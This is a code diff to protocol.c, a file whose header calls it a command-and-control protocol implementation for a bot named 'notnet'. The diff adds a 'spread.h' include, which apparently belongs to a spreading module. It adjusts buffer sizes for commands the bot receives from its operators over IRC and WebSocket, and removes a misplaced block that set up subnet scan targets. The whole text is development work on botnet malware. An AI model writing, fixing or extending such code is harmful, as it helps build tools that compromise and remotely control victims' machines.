@@ -3,6 +3,7 @@
  * protocol.c - C2 protocol implementation (IRC, HTTP, WebSocket)
  */
 #include "protocol.h"
+#include "spread.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -526,7 +527,7 @@ int protocol_process_commands(notnet_bot_t *bot) {
         if (result == 1) {
             /* New command in buffer - add to queue */
             if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
-                snprintf(bot->cmd_queue[bot->cmd_count], 255, "%s", buf);
+                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%s", buf);
                 bot->cmd_count++;
             }
         }
@@ -586,7 +587,7 @@ int protocol_process_commands(notnet_bot_t *bot) {
         int result = ws_read(bot, buf, sizeof(buf));
         if (result > 0) {
             if (bot->cmd_count < 256) {
-                snprintf(bot->cmd_queue[bot->cmd_count], 255, "%s", buf);
+                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%s", buf);
                 bot->cmd_count++;
             }
         }
@@ -813,11 +814,6 @@ int load_config(notnet_bot_t *bot, const char *path) {
             bot->redis_enabled = atoi(value);
         } else if (strcmp(key, "rdp_enabled") == 0) {
             bot->rdp_enabled = atoi(value);
-            /* Format: "192.168.1.0/24,10.0.0.0/24" or one per line with prefix "scan_target_X" */
-            if (bot->scan_target_count < 16) {
-                strncpy(bot->scan_targets[bot->scan_target_count], value, 255);
-                bot->scan_target_count++;
-            }
         } else if (strncmp(key, "scan_target_", 12) == 0) {
             /* Legacy: scan_target_0, scan_target_1, etc. */
             int idx = atoi(key + 12);
